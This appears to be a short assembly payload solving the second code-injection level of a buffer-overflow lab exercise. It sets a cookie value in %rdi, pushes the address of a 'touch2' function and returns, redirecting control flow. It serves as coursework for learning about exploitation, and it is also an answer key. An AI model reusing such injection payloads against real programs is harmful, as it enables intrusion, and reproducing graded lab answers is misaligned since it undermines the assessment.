# inject codes of CIA-L2

movq	$0x659eb3c8, %rdi	# cookie --> rdi
pushq	$0x40185f	# call touch2
ret
